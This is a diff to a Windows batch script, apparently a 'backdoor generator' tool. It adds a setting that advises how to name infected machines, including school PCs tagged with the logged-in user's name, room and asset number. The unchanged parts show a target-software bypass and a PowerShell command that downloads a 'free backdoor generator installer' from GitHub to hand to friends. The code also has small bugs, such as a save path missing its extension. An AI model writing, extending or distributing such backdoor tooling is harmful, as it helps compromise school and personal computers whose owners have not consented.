@@ -11,13 +11,14 @@ ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false
+set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false&set device_name_advice=true
 if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
 if not exist C:\ProgramData\updatelogs.sav echo true>C:\ProgramData\updatelogs.sav
 if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_enabled.sav
 if not exist C:\ProgramData\antivirus.sav echo true>C:\ProgramData\antivirus.sav
 if not exist C:\ProgramData\progress_bar.sav echo true>C:\ProgramData\progress_bar.sav
 if not exist C:\ProgramData\target_software_bypass.sav echo true>C:\ProgramData\target_software_bypass.sav
+if not exist C:\ProgramData\device_name_advice.sav echo true>C:\ProgramData\device_name_advice.sav
 title Beta Release %update_number%
 cls
 < C:\ProgramData\autofullscreen.sav (
@@ -37,6 +38,9 @@ cls
 )
 < C:\ProgramData\target_software_bypass.sav (
   set /p target_software_bypass=
+)
+< C:\ProgramData\device_name_advice.sav (
+  set /p device_name_advice=
 )
 if %autofullscreen% equ true CSCRIPT //nologo "%TempVBSFile%"
 if %username% equ 61481 goto skip_dev
@@ -70,14 +74,15 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   echo [33mpress M to be taken to settings[0m
   choice /C YNM /m "does target PC have admin rights? Y/N:
   if %errorlevel% equ 1 (set target_admin_rights=true) else (if %errorlevel% equ 2 (set target_admin_rights=false) else (goto menu))
-  echo.  
+  echo.
+  if %device_name_advice% equ true (  
   echo it is recomended for school computers to use this format: username_roomID_assetnumber
   echo username is the username of whoever was logged on while infecting
   echo roomID is the room name, expample: BF12
   echo assetnumber can be found on a sticker on the PC you are infecting.
   echo.
   echo for personal devices it is recomended to use ownername_PC/laptop_infectionnumber
-  echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices
+  echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices)
   echo DO NOT USE SPACES, replace them with _ or -
   echo.
   set /p opt1=Device name:
@@ -399,11 +404,12 @@ echo 3(debug mode (app will not be dissabled when it is broken) (%debug_enabled%
 echo 4(built in antivirus (prevents you from backdooring your own PC) (%antivirus%)
 echo 5(run progress_bar while generating (%progress_bar%) 
 echo 6(legacy mode, old software bypass mode (broken) (%target_software_bypass%)
-echo 7(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
-echo 8(download EP bot
-echo 9(back to main menu
+echo 7(advice on proper device naming (%device_name_advice%)
+echo 8(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
+echo 9(download EP bot
+echo A(back to main menu
 echo.
-choice /M "option: " /c 123456789 /n
+choice /M "option: " /c 123456789A /n
 if %errorlevel% equ 1 goto menu1
 if %errorlevel% equ 2 goto menu2
 if %errorlevel% equ 3 goto menu3
@@ -412,7 +418,8 @@ if %errorlevel% equ 5 goto menu5
 if %errorlevel% equ 6 goto menu6
 if %errorlevel% equ 7 goto menu7
 if %errorlevel% equ 8 goto menu8
-if %errorlevel% equ 9 goto exit_menu
+if %errorlevel% equ 9 goto menu9
+if %errorlevel% equ A goto exit_menu
 :menunxt
 echo %autofullscreen%>C:\ProgramData\autofullscreen.sav
 echo %updatelogs%>C:\ProgramData\updatelogs.sav
@@ -420,6 +427,7 @@ echo %debug_enabled%>C:\ProgramData\debug_enabled.sav
 echo %antivirus%>C:\ProgramData\antivirus.sav
 echo %progress_bar%>C:\ProgramData\progress_bar.sav
 echo %target_software_bypass%>C:\ProgramData\target_software_bypass.sav
+echo %device_name_advice%>C:\ProgramData\device_name_advice
 goto menu
 :menu1
 if %autofullscreen% equ false (set autofullscreen=true
@@ -452,9 +460,14 @@ goto menunxt)
 if %target_software_bypass% equ true set target_software_bypass=false
 goto menunxt
 :menu7
+if %device_name_advice% equ false (set device_name_advice=true
+goto menunxt)
+if %device_name_advice% equ true set device_name_advice=false
+goto menunxt
+:menu8
 set /p free_dir_install=download location:
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_installer.bat").Content >"%free_dir_install%\free backdoor generator installer.bat"
 goto menunxt
-:menu8
+:menu9
 set EP_install_launched_from_menu=true
 goto menu_install
